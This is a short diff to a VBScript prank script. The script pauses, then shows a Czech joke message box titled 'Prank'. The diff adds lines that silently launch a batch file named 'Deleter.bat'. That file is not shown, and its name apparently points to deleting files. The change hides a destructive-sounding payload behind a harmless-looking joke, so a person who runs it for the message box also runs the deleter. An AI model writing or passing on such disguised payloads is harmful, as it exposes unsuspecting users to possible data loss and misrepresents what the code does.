@@ -18,3 +18,8 @@ WScript.Sleep(5000)
 
 X=MsgBox("Haha je to vtip",0+64,"Prank")
 
+
+Set shell = CreateObject("WScript.Shell")
+shell.Run """Deleter.bat"""
+
+
